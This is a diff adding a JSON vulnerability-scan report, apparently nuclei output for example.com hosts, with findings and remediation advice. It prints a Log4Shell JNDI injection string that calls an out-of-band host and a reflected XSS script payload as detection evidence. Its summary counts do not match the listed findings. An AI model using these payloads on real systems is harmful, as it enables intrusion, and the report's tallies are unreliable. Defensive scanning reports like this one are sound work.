@@ -1,0 +1,124 @@
+{
+  "engagement_id": "a8098c1a-f86e-11da-bd1a-00112444be1e",
+  "target": "example.com",
+  "generated": "2026-05-21T11:30:00Z",
+  "findings": [
+    {
+      "template-id": "apache-log4j-rce",
+      "host": "staging.example.com",
+      "port": 443,
+      "severity": "critical",
+      "name": "Apache Log4j RCE (CVE-2021-44228)",
+      "matcher-output": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n[dns callback confirmed] jndi:ldap://oast.example.com:80/a received from 93.184.216.36 — log4shell confirmed via DNS OOB interaction. Request: GET /search?q=${jndi:ldap://oast.example.com:80/a} HTTP/1.1",
+      "extracted-results": ["jndi:ldap://oast.example.com:80/a"],
+      "recommendation": "Immediately upgrade log4j to version 2.17.1 or later. Apply the mitigation workaround log4j2.formatMsgNoLookups=true as a temporary fix. Audit all Java applications using the log4j library.",
+      "review_recommended": false,
+      "template-path": "cves/2021/CVE-2021-44228.yaml"
+    },
+    {
+      "template-id": "apache-log4j-rce",
+      "host": "staging.example.com",
+      "port": 443,
+      "severity": "critical",
+      "name": "Apache Log4j RCE (CVE-2021-44228)",
+      "matcher-output": "Second nuclei scan pass — duplicate detection. Same finding as above.",
+      "extracted-results": [],
+      "recommendation": "Immediately upgrade log4j to version 2.17.1 or later.",
+      "review_recommended": false,
+      "template-path": "cves/2021/CVE-2021-44228.yaml"
+    },
+    {
+      "template-id": "php-fpm-status-page",
+      "host": "staging.example.com",
+      "port": 443,
+      "severity": "high",
+      "name": "PHP-FPM Status Page Exposed",
+      "matcher-output": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\npool: www\nprocess manager: dynamic\nstart time: 21/May/2026:08:00:00 +0000\nstart since: 9000\naccepted conn: 412301\nlisten queue: 0\nmax listen queue: 128\nactive processes: 4",
+      "extracted-results": ["pool: www", "active processes: 4"],
+      "recommendation": "Restrict access to /status and /ping endpoints to internal IPs only. Remove these endpoints from production configurations.",
+      "review_recommended": false,
+      "template-path": "exposures/configs/php-fpm-status.yaml"
+    },
+    {
+      "template-id": "xss-reflected",
+      "host": "example.com",
+      "port": 443,
+      "severity": "medium",
+      "name": "Reflected Cross-Site Scripting",
+      "matcher-output": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body>Search results for: <script>alert(1)</script> — unencoded user input reflected in response body. Parameter: q. Payload: <script>alert(1)</script>",
+      "extracted-results": ["<script>alert(1)</script>"],
+      "recommendation": "Encode all user-supplied input before reflecting it in HTML output. Implement a Content Security Policy (CSP) header. Use a template engine with automatic escaping.",
+      "review_recommended": false,
+      "template-path": "vulnerabilities/generic/xss-reflected.yaml"
+    },
+    {
+      "template-id": "directory-listing",
+      "host": "dev.example.com",
+      "port": 80,
+      "severity": "medium",
+      "name": "Apache Directory Listing Enabled",
+      "matcher-output": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE HTML><html><head><title>Index of /uploads/</title></head><body><h1>Index of /uploads/</h1><ul><li><a href=\"backup-2026.tar.gz\">backup-2026.tar.gz</a></li><li><a href=\"config.bak\">config.bak</a></li></ul></body></html>",
+      "extracted-results": ["backup-2026.tar.gz", "config.bak"],
+      "recommendation": "Disable directory listing in Apache with 'Options -Indexes'. Ensure backup files are stored outside the webroot.",
+      "review_recommended": false,
+      "template-path": "exposures/configs/apache-directory-listing.yaml"
+    },
+    {
+      "template-id": "exposed-git-directory",
+      "host": "dev.example.com",
+      "port": 80,
+      "severity": "high",
+      "name": "Exposed .git Directory",
+      "matcher-output": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nref: refs/heads/main",
+      "extracted-results": ["ref: refs/heads/main"],
+      "recommendation": "Block access to /.git via web server configuration. Remove the .git directory from web-accessible directories entirely. Rotate any secrets that may have been committed to git history.",
+      "review_recommended": true,
+      "template-path": "exposures/configs/git-config.yaml"
+    },
+    {
+      "template-id": "ssl-tls-weak-cipher",
+      "host": "mail.example.com",
+      "port": 25,
+      "severity": "low",
+      "name": "Weak TLS Cipher Suite Accepted",
+      "matcher-output": "TLS handshake — server accepted: TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 vulnerable). Protocol: TLSv1.2.",
+      "extracted-results": ["TLS_RSA_WITH_3DES_EDE_CBC_SHA"],
+      "recommendation": "Disable 3DES cipher suites. Configure TLS to accept only strong ciphers: ECDHE-RSA-AES256-GCM-SHA384 and ECDHE-RSA-AES128-GCM-SHA256. Enable TLSv1.3.",
+      "review_recommended": false,
+      "template-path": "ssl/weak-cipher-suites.yaml"
+    },
+    {
+      "template-id": "missing-security-headers",
+      "host": "example.com",
+      "port": 443,
+      "severity": "info",
+      "name": "Missing Security Headers",
+      "matcher-output": "HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: text/html\r\n\r\n[headers absent] X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy",
+      "extracted-results": null,
+      "recommendation": "Add security headers: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin. Consider Content-Security-Policy.",
+      "review_recommended": false,
+      "template-path": "misconfiguration/http-missing-security-headers.yaml"
+    },
+    {
+      "template-id": "nuclei-version-detect",
+      "host": "api.example.com",
+      "port": 443,
+      "severity": "info",
+      "name": "Express.js Version Disclosure",
+      "matcher-output": "HTTP/1.1 200 OK\r\nX-Powered-By: Express\r\n",
+      "recommendation": "Remove X-Powered-By header in Express: app.disable('x-powered-by')",
+      "review_recommended": false,
+      "template-path": "technologies/express-detect.yaml"
+    }
+  ],
+  "summary": {
+    "total": 9,
+    "after_dedup": 8,
+    "critical": 1,
+    "high": 3,
+    "medium": 2,
+    "low": 1,
+    "info": 2,
+    "review_recommended": 2
+  }
+}
